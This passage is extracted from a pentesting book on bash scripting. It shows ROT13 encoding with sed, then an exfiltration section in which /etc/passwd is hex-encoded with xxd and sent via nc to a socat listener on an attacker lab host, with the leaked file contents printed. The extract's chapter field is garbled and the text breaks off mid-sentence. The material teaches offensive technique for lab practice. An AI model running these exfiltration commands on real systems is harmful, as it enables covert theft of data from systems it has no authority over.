@@ -1,0 +1,59 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 25 - $ echo "No Starch Press" | sed 'y/abcdefghijklmnopqrstuvwxyzABCDEFGHIJK
+LMNOPQRSTUVWXYZ/nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM/'
+Security Relevance Score: 6
+Word Count: 508
+Extracted: 2025-06-13 23:40:57
+
+---
+
+$ echo "No Starch Press" | sed 'y/abcdefghijklmnopqrstuvwxyzABCDEFGHIJK
+LMNOPQRSTUVWXYZ/nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM/'
+
+Ab Fgnepu Cerff
+
+Listing 12-25: Performing ROT13 encryption with sed
+We use sed with the transliteration option (y) to tell the tool to replace the source characters with the destination characters. This requires the source pattern to have the same number of characters as the destination pattern. In this case, we supply the entire alphabet in lowercase- and uppercase, along with the rotated characters.
+To rotate the characters back to their original form, simply swap the location of the patterns so that the destination pattern becomes the source (Listing 12-26).
+$ echo "Ab Fgnepu Cerff" | sed 'y/nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABC
+DEFGHIJKLM/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/'
+
+No Starch Press
+
+Listing 12-26: Decrypting ROT13 with sed
+Try incorporating this encryption logic into a larger bash script. Here are a few ideas:
+
+Accept a string as input from a user and allow them to decide whether to encrypt or decrypt the string.
+Allow the user to choose which rotation algorithm to use. You don’t have to rotate the characters 13 times. Why not try 20 times?
+Use what you learned in “Encryption” on page 298 to combine the substitution cipher with other encryption schemes. For example, accept text input from the user running the script, rotate its characters, then encrypt it. To retrieve the original message, perform the inverse operations.
+
+
+
+
+Exfiltration
+Once an attacker gains access to pertinent information, they must transmit the data from the network while staying covert. We call this task exfiltration. Enterprise security software looks for signs of data exfiltration in various ways, but attackers have come up with creative approaches to make the process less obvious. We’ll cover a few exfiltration strategies in this section.
+
+Raw TCP
+In earlier chapters, we sent data over raw TCP connections by using tools such as Ncat, Netcat, and socat. By using the data concealment techniques covered in this chapter thus far, we can disguise this data before transmitting it.
+For example, before sending the contents of the /etc/passwd file over TCP, we can convert the ASCII data to hexadecimal by using xxd. To receive this data, we’ll set up a socat TCP listener on Kali. Run the command in Listing 12-27 to start the listener.
+$ socat TCP-LISTEN:12345,reuseaddr,fork - | xxd -r -p
+Listing 12-27: Creating a TCP listener that decodes hexadecimal data
+socat will listen on port 12345/TCP and pipe the raw data to xxd to convert the hexadecimal to readable text.
+Next, we’ll transmit the content of the file in hexadecimal by using nc. Run the command in Listing 12-28 on any of the lab machines, such as p-jumpbox-01 (172.16.10.13).
+$ xxd -p /etc/passwd | nc 172.16.10.1 12345
+Listing 12-28: Encoding a file’s data before transmitting it over TCP
+In your listener, you should see the decoded contents of /etc/passwd:
+socat TCP-LISTEN:12345,reuseaddr,fork - | xxd -r -p
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+--snip--
+
+You could further improve this exfiltration method by setting up both sides of the connection to use SSL to establish an encrypted exfiltration channel, as you did in
